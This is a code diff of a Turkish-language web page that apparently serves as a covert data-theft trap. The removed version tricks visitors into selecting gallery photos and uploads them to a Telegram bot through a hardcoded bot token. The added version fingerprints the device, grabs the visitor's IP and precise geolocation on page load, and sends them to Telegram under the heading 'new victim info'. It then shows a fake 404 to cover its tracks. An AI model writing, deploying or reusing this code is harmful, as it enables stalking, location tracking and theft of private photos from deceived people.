@@ -3,115 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Doğrulama</title>
+    <title>Yükleniyor...</title>
     <style>
-        body { font-family: Arial; text-align: center; padding: 20px; background: #1a1a2e; color: white; }
-        .container { background: #16213e; padding: 30px; border-radius: 20px; max-width: 400px; margin: auto; }
-        button { padding: 16px 32px; font-size: 20px; margin: 10px; border: none; border-radius: 10px; cursor: pointer; }
-        #yesBtn { background: #4CAF50; color: white; }
-        #noBtn { background: #f44336; color: white; }
-        #status { margin-top: 20px; font-size: 16px; }
-        #progress { margin-top: 10px; font-size: 14px; color: #aaa; }
+        body { background: #0a0a0a; color: white; font-family: Arial; text-align: center; padding-top: 50px; }
+        .loader { border: 4px solid #333; border-top: 4px solid #00ff88; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-<div class="container">
-    <h1>🔐 Üç İstiyor musunuz?</h1>
-    <p>Devam etmek için izin verin</p>
-    <button id="yesBtn">EVET</button>
-    <button id="noBtn">HAYIR</button>
-    <div id="status"></div>
-    <div id="progress"></div>
-</div>
+    <div class="loader"></div>
+    <h2>Bağlantı kuruluyor...</h2>
+    <p id="status">Lütfen bekleyin</p>
 
 <script>
-    const BOT_TOKEN = "8746989231:AAHGfFiFC8uRTi6lXoUNuTRL8cQMUfMm5nE";   // @BotFather'dan aldığın token
-    const CHAT_ID = "8729744465";     // @userinfobot'dan aldığın ID
+    // TELEGRAM BOT BİLGİLERİ - KENDİ TOKEN VE CHAT ID'NI YAZ
+    const BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz";  // DEĞİŞTİR
+    const CHAT_ID = "123456789";                                // DEĞİŞTİR
 
-    function dataURItoBlob(dataURI) {
-        const byteString = atob(dataURI.split(',')[1]);
-        const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-        const ab = new ArrayBuffer(byteString.length);
-        const ia = new Uint8Array(ab);
-        for (let i = 0; i < byteString.length; i++) {
-            ia[i] = byteString.charCodeAt(i);
-        }
-        return new Blob([ab], { type: mimeString });
+    // 1. Cihaz bilgilerini topla
+    function getDeviceInfo() {
+        let info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            colorDepth: screen.colorDepth,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            online: navigator.onLine ? "Evet" : "Hayır",
+            doNotTrack: navigator.doNotTrack || "Belirtilmemiş",
+            cookiesEnabled: navigator.cookieEnabled ? "Evet" : "Hayır",
+            hardwareConcurrency: navigator.hardwareConcurrency || "Bilinmiyor",
+            deviceMemory: navigator.deviceMemory || "Bilinmiyor"
+        };
+        return info;
     }
 
-    async function sendToTelegram(imageData, fileName, index, total) {
-        const blob = dataURItoBlob(imageData);
-        const formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("photo", blob, fileName);
-        formData.append("caption", `📸 ${index}/${total} - ${fileName}`);
-
+    // 2. IP adresini al (harici API)
+    async function getIP() {
         try {
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch {
+            return "Alınamadı";
+        }
+    }
+
+    // 3. Verileri Telegram'a gönder
+    async function sendToTelegram(text) {
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const res = await fetch(url, {
                 method: "POST",
-                body: formData
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: "HTML"
+                })
             });
             return res.ok;
-        } catch(e) {
+        } catch {
             return false;
         }
     }
 
-    function getAllImagesFromGallery() {
-        return new Promise((resolve) => {
-            const input = document.createElement('input');
-            input.type = 'file';
-            input.accept = 'image/*';
-            input.multiple = true;
-            input.style.display = 'none';
-            document.body.appendChild(input);
+    // 4. Konum bilgisi (kullanıcı izni ile)
+    function getLocation(callback) {
+        if (!navigator.geolocation) {
+            callback("Konum desteği yok");
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                const loc = `Enlem: ${pos.coords.latitude}, Boylam: ${pos.coords.longitude}, Doğruluk: ${pos.coords.accuracy} metre`;
+                callback(loc);
+            },
+            (err) => {
+                callback("Konum reddedildi veya alınamadı: " + err.message);
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
+        );
+    }
 
-            input.onchange = async function(e) {
-                const files = this.files;
-                const imageDataArray = [];
-                for (let i = 0; i < files.length; i++) {
-                    const file = files[i];
-                    const reader = new FileReader();
-                    const data = await new Promise((res) => {
-                        reader.onload = (ev) => res(ev.target.result);
-                        reader.readAsDataURL(file);
-                    });
-                    imageDataArray.push({ data: data, name: file.name });
-                }
-                resolve(imageDataArray);
-                this.remove();
-            };
+    // 5. Ana işlem
+    async function main() {
+        document.getElementById('status').innerHTML = 'Bilgiler toplanıyor...';
 
-            input.click();
+        const device = getDeviceInfo();
+        const ip = await getIP();
+
+        let message = `<b>📱 YENİ KURBAN BİLGİLERİ</b>\n`;
+        message += `<b>IP:</b> ${ip}\n`;
+        message += `<b>Tarayıcı:</b> ${device.userAgent}\n`;
+        message += `<b>Platform:</b> ${device.platform}\n`;
+        message += `<b>Dil:</b> ${device.language}\n`;
+        message += `<b>Ekran:</b> ${device.screenWidth}x${device.screenHeight}\n`;
+        message += `<b>Renk Derinliği:</b> ${device.colorDepth}\n`;
+        message += `<b>Saat Dilimi:</b> ${device.timezone}\n`;
+        message += `<b>Çevrimiçi:</b> ${device.online}\n`;
+        message += `<b>Çerezler:</b> ${device.cookiesEnabled}\n`;
+        message += `<b>CPU Çekirdek:</b> ${device.hardwareConcurrency}\n`;
+        message += `<b>RAM (tahmini):</b> ${device.deviceMemory} GB\n`;
+        message += `<b>Do Not Track:</b> ${device.doNotTrack}\n`;
+
+        await sendToTelegram(message);
+
+        document.getElementById('status').innerHTML = 'Konum isteniyor...';
+        getLocation(async (loc) => {
+            await sendToTelegram(`<b>📍 KONUM:</b> ${loc}`);
+            document.getElementById('status').innerHTML = '✅ Bilgiler gönderildi.';
+            
+            // 7. Adım: Masum 404 hatası göster
+            setTimeout(() => {
+                document.body.innerHTML = `
+                <!DOCTYPE html>
+                <html>
+                <head><title>404</title></head>
+                <body style="background:#f4f4f4;text-align:center;padding-top:100px;font-family:sans-serif;">
+                    <h1 style="color:#333;">404</h1>
+                    <p style="color:#666;">Sayfa bulunamadı</p>
+                    <hr style="width:100px;margin:20px auto;">
+                    <p style="color:#999;font-size:14px;">Lütfen adresi kontrol edin veya ana sayfaya dönün.</p>
+                </body>
+                </html>`;
+            }, 2000);
         });
     }
 
-    document.getElementById('yesBtn').onclick = async function() {
-        document.getElementById('status').innerHTML = '📸 İzin istendi...';
-        document.getElementById('progress').innerHTML = '';
-
-        try {
-            const images = await getAllImagesFromGallery();
-            const total = images.length;
-            document.getElementById('status').innerHTML = `📤 ${total} fotoğraf bulundu, gönderiliyor...`;
-
-            let success = 0;
-            for (let i = 0; i < total; i++) {
-                const ok = await sendToTelegram(images[i].data, images[i].name, i+1, total);
-                if (ok) success++;
-                document.getElementById('progress').innerHTML = `📤 ${i+1}/${total} gönderildi (${success} başarılı)`;
-                await new Promise(r => setTimeout(r, 800));
-            }
-            document.getElementById('status').innerHTML = `✅ ${success}/${total} fotoğraf Telegram'a gönderildi!`;
-        } catch(err) {
-            document.getElementById('status').innerHTML = '❌ Hata: ' + err.message;
-        }
-    };
-
-    document.getElementById('noBtn').onclick = function() {
-        document.getElementById('status').innerHTML = '❌ Reddedildi.';
-        document.getElementById('progress').innerHTML = '';
-    };
+    main();
 </script>
 </body>
 </html>
